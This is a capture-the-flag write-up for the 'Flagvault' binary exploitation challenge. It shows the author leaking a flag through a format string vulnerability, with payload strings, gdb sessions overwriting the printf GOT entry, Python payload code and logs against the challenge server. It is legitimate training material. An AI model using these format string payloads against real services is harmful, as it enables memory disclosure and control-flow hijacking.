# Flagvault

200
Binary Exploitation
12 Solves as of solving

## Description
Seems like we require some credentials to access the vault containing the flag. Could we possibly leak it? You are provided with the binary of the service for analysis. Note that your copy of the binary does not contain the actual flag or credentials. You have to get it from the network service!

Interact with the service at: challenges.csdc20t.ctf.sg:10012

Hint: Look very closely at how stuff is printed

## Given
flagvault

# Some ideas
1. It's a format string attack, since from ltrace, we can see that untrusted user input is being passed into printf
    * The username variable is likely in 0x8048a74
2. We want to go over to 0x80486ea
3. eip location = 0xffffcbcc
3. Saved eip location = 0x8048676
    * Such a large difference (along with character limit) means we can't just %x filler all the way to the stack pointer i think
    * Distance between esp and eip is 4160439638 decimal
4. printf location is 0804a010

Researching more about format string attack
1. https://www.ayrx.me/protostar-walkthrough-format
2. https://stackoverflow.com/questions/21162273/overwrite-return-address-simple-format-string-exploit
3. https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf
4. https://samsclass.info/127/proj/p6-fs.htm
5. https://nuc13us.wordpress.com/2015/09/04/format-string-exploit-overwrite-got/
6. https://people.csail.mit.edu/alinush/cse409-fall-2011/07-format-string-attacks.pdf

But the ones which are really good at explaining are
1. [A Simple Format String exploit Example](https://www.youtube.com/watch?v=0WvrSfcdq1I)
2. [Format String Exploit and overwrite the Global Offset Table - bin 0x13](https://www.youtube.com/watch?v=t1LH9D5cuK4)
3. [What is use of %n in printf() ?](https://www.geeksforgeeks.org/g-fact-31/)
    *  %n stores the number of bytes(printed characters) into the memory location on the stack
4. [protostar-format-4 walkthrough](https://medium.com/@airman604/protostar-format-4-walkthrough-b8f73f414e59)
5. https://github.com/firmianay/Life-long-Learner/blob/master/SEED-labs/format_string-vulnerability-lab.md

After some thinking some ideas to jump to the flag
1. Overwrite the GOT: Probably printf
2. Overwrite the stack return pointer but that seems too far?

# Some random experimentation
\xd0\x86\x04\x80%x%n

%4160439662d\xd0\x86\x04\x80%n

`\xd0\x86\x04\%x%x%x%n`: Segmentation fault, crashes at 0x0804868d

%136410235$x%n

`%4$136410235x%n` : Gives you a ton of padding

`\x76\x86\x04\x80%4$136410235x%n`


## Where (in memory) to go to?

Looking at the disassembled code, an instinct is to try overwriting the printf

```
$ objdump -TR ./flagvault 

./flagvault:     file format elf32-i386

DYNAMIC SYMBOL TABLE:
00000000      DF *UND*	00000000  GLIBC_2.0   strcmp
00000000      DF *UND*	00000000  GLIBC_2.0   printf
00000000      DF *UND*	00000000  GLIBC_2.0   puts
00000000  w   D  *UND*	00000000              __gmon_start__
00000000      DF *UND*	00000000  GLIBC_2.0   __libc_start_main
00000000      DF *UND*	00000000  GLIBC_2.0   setvbuf
00000000      DF *UND*	00000000  GLIBC_2.7   __isoc99_scanf
0804a044 g    DO .bss	00000004  GLIBC_2.0   stdout
0804878c g    DO .rodata	00000004  Base        _IO_stdin_used
0804a040 g    DO .bss	00000004  GLIBC_2.0   stdin


DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049ffc R_386_GLOB_DAT    __gmon_start__
0804a040 R_386_COPY        stdin@@GLIBC_2.0
0804a044 R_386_COPY        stdout@@GLIBC_2.0
0804a00c R_386_JUMP_SLOT   strcmp@GLIBC_2.0
0804a010 R_386_JUMP_SLOT   printf@GLIBC_2.0
0804a014 R_386_JUMP_SLOT   puts@GLIBC_2.0
0804a018 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
0804a01c R_386_JUMP_SLOT   setvbuf@GLIBC_2.0
0804a020 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7
```

gdb testing, overwriting printf
```
0x08048676 in main ()
(gdb) set {int}0x0804a010=0x80486d0
(gdb) ni
0x08048679 in main ()
(gdb) 
0x0804867e in main ()
(gdb) 
Incorrect credentials!
[Inferior 1 (process 11485) exited normally]
(gdb) 
The program is not being run.
(gdb) 
```
set {int}0x0804a010=0x80486f9

set {int}0x0804a010=0x80486ea
```
0x08048676 in main ()
(gdb) set {int}0x0804a010=0x80486ea
(gdb) ni
0x08048679 in main ()
(gdb) 
0x0804867e in main ()
(gdb) 
CTFSG{<REDACTED FLAG>}
```
So we know we want to go to the location 0x80486ea to get the flag, and to do so we have to overwrite 0x0804a010

## How to do format string attack

We know the buffer is 512 bytes long
(so we do padding, in the pad function. of solve.py)

Find out what's in memory first
```
8888888888 888                  888     888                  888 888
888        888                  888     888                  888 888
888        888                  888     888                  888 888
8888888    888  8888b.   .d88b. Y88b   d88P 8888b.  888  888 888 888888
888        888     "88b d88P"88b Y88b d88P     "88b 888  888 888 888
888        888 .d888888 888  888  Y88o88P  .d888888 888  888 888 888
888        888 888  888 Y88b 888   Y888P   888  888 Y88b 888 888 Y88b.
888        888 "Y888888  "Y88888    Y8P    "Y888888  "Y88888 888  "Y888
                             888
                        Y8b d88P
                         "Y88P"
========================================================================
                                USER LOGIN
========================================================================
username => AAAABBBB%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--
Enter password for AAAABBBB61700000--6f777373--75006472--6e726573--656d61--41414141--42424242--2d2d7825--2d2d7825--2d2d7825--2d2d7825--2d2d7825--2d2d7825--2d2d7825-- => q
Incorrect credentials!
```
A (0x41) starts from the 6th byte so lets use the %$ notation to straight away access that

```
username => AAAA%6$x
Enter password for AAAA41414141 => 
```
Cool looks like it works

Let's try overwriting memory again
```
import struct
buf = ''
buf += struct.pack('I', PRINTF_PLT)
buf += '|%p|'* 5 # Go to the location where the username is stored
# junk to make printf output 0x41 characters
buf += 'A'*(0x41-len(buf))
# this is where printf will write FLAG to PRINTF_PLT
buf += '%n'
print(buf)
```
```
username => 
Breakpoint 1, 0x0804866b in main ()
(gdb) ni
0x0804866c in main ()
(gdb) ni
0x08048671 in main ()
(gdb) x/24xw $esp
0xffffcbcc:	0x08048a74	0xffffcbe8	0x61700000	0x6f777373
0xffffcbdc:	0x75006472	0x6e726573	0x00656d61	0xf7ff276d
0xffffcbec:	0x00000001	0x6adb07e1	0x00000cf3	0xfffff840
0xffffcbfc:	0xf7f4b3a2	0xf7ffdc5c	0xf7fcf0c0	0xffffcc48
0xffffcc0c:	0x00000007	0xf7fd3128	0x6e43a318	0xf7ffdc50
0xffffcc1c:	0xf7fddffd	0x00000000	0x00000000	0xf7fd31a0
(gdb) ni
0x08048676 in main ()
(gdb) ni
0x08048679 in main ()
(gdb) ni
0x0804867e in main ()
(gdb) ni
Enter password for 0x08048683 in main ()
(gdb) x/24xw $esp
0xffffcbd0:	0x08048a7a	0x61700000	0x6f777373	0x75006472
0xffffcbe0:	0x6e726573	0x00656d61	0x0804a010	0x7c70257c
0xffffcbf0:	0x7c70257c	0x7c70257c	0x7c70257c	0x7c70257c
0xffffcc00:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcc10:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcc20:	0x41414141	0x41414141	0x006e2541	0x00000007
(gdb) 
```

By the way when debugging, to go to the scanf of the username type `break *0x804866b`

After all this while, I tried doing more reading on how to overwrite the printf address and then I stumbled upon [this](https://medium.com/@airman604/protostar-format-4-walkthrough-b8f73f414e59).
Apparently you just need to find the memory address of the flag and print it out. So lets try it. Flag Address `0x8048a93`

Python 2 code
```
import struct
FLAG=0x8048a93
buf = ''
buf += struct.pack('I', FLAG)

buf += '|%p'* 5 # Go to the location where the username is stored
# junk to make printf output 0x41 characters
buf += "%s"
print(buf)
```
```
username => Enter password for ï¿½|0x61700000|0x6f777373|0x75006472|0x6e726573|0x656d61CTFSG{<REDACTED FLAG>} => Incorrect credentials!
```

# Running on netcat
Let's double check the memory address first
```
$ nc challenges.csdc20t.ctf.sg 10012 
8888888888 888                  888     888                  888 888
888        888                  888     888                  888 888
888        888                  888     888                  888 888
8888888    888  8888b.   .d88b. Y88b   d88P 8888b.  888  888 888 888888
888        888     "88b d88P"88b Y88b d88P     "88b 888  888 888 888
888        888 .d888888 888  888  Y88o88P  .d888888 888  888 888 888
888        888 888  888 Y88b 888   Y888P   888  888 Y88b 888 888 Y88b.
888        888 "Y888888  "Y88888    Y8P    "Y888888  "Y88888 888  "Y888
                             888
                        Y8b d88P
                         "Y88P"
========================================================================
                                USER LOGIN
========================================================================
username => AAAA%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--
Enter password for AAAA30740070--6b335350--70543172--77733540--64610064--6e696d--41414141--2d2d7825--2d2d7825--2d2d7825--2d2d7825--2d2d7825--2d2d7825-- => 
```
Ok now it starts from the 7th byte

Since I want to try using pwntools to do this, let's code!
Check and run main.py. Take note that the flag was not in the original memory address, so just shift the address to see if it fits? Idk I got lucky (I just +16).

```
$ python main.py
[+] Opening connection to challenges.csdc20t.ctf.sg on port 10012: Done
8888888888 888                  888     888                  888 888
888        888                  888     888                  888 888
888        888                  888     888                  888 888
8888888    888  8888b.   .d88b. Y88b   d88P 8888b.  888  888 888 888888
888        888     "88b d88P"88b Y88b d88P     "88b 888  888 888 888
888        888 .d888888 888  888  Y88o88P  .d888888 888  888 888 888
888        888 888  888 Y88b 888   Y888P   888  888 Y88b 888 888 Y88b.
888        888 "Y888888  "Y88888    Y8P    "Y888888  "Y88888 888  "Y888
                             888
                        Y8b d88P
                         "Y88P"
========================================================================
                                USER LOGIN
========================================================================
username =>
[*] Switching to interactive mode
 Enter password for \x93\x8a\x04\xa3\x8a\x04|0x30740070|0x6b335350|0x70543172|0x77733540|0x64610064|0x6e696d|sword for |CTFSG{f0rm4tt3d_d4t4_l34k4g3} => $  
```

# Flag
`CTFSG{f0rm4tt3d_d4t4_l34k4g3}`

# Others 
Pwning is possible I heard, idk haven't tried
